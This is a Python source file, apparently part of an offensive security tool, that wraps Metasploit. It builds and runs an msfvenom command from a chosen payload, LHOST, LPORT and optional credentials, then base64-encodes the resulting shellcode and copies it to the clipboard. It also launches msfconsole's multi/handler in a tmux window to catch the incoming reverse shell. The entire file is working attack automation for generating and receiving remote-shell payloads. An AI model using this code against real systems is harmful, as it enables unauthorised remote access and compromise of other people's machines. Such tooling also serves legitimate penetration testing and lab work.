import threading
import pyperclip
import base64
import os
import subprocess
import time 
from imports.logging_cfg import log
import libtmux
# https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/msfvenom
# https://libtmux.git-pull.com/reference/index.html
class MsfVenomShellcode:
    def __init__(self, msfvenom_command, verbose):
        self.verbose = verbose
        self.payload = msfvenom_command[0]
        self.msf_lhost = msfvenom_command[1]
        self.msf_lport = msfvenom_command[2]
        self.msf_user = msfvenom_command[3]
        self.msf_pass = msfvenom_command[4]


    def launch_tmux(self):
        try:
            server = libtmux.Server()
            session = server.sessions[0]
            window = session.new_window(attach=False, window_name="ProtoHandler-msf")
            pane = window.attached_pane
            pane.send_keys(f"msfconsole -q -x 'use exploit/multi/handler; set lhost {self.msf_lhost} ; set lport {self.msf_lport} ; set payload {self.payload} ; run'", enter=True)
            completion_indicators = ["exit"]
            
            def check_output():
                while True:
                    captured_output = pane.capture_pane()
                    if any(indicator in captured_output for indicator in completion_indicators):
                        window.kill_window()
                        break

            thread = threading.Thread(target=check_output, daemon=True)
            thread.start()
        except Exception as e:
            print(e)


    def generate_shellcode(self):
        try:
            command = f'msfvenom -p {self.payload}'
            if self.msf_lhost:
                command += f' LHOST={self.msf_lhost}'
            if self.msf_lport:
                command += f' LPORT={self.msf_lport}'
                log.info("Sending msf commands to 'ProtoHandler-msf' tab...")
                self.launch_tmux()
            if self.msf_user and self.msf_pass:
                command += f' USER={self.msf_user} PASS={self.msf_pass}'

            command += ' -f raw -o shellcode.bin'
            print("Selected payload: ", command)

            log.info("Generating payload ...")
            subprocess.run(command, shell=True, check=True)
            log.info("Writing payload data to a file")
            shellcode_file = "shellcode.bin"

            with open(shellcode_file, 'rb') as file:
                shellcode_data = file.read()
                encoded_output = base64.b64encode(shellcode_data).decode('utf-8')
            
            log.info("Removing shellcode output file")
            os.remove(shellcode_file)
                
            log.success("Encoded payload created")
            
        except subprocess.CalledProcessError as e:
            print(f"Command execution failed with return code {e.returncode}")
        except Exception as e:
            print(e)
        try:
            pyperclip.copy(encoded_output)
            log.success("Encoded payload copied to clipboard")
            return encoded_output
        except Exception as e:
            log.warning("Unable to copy command to clipboard - printing to console instead")
            return encoded_output
    
    
    
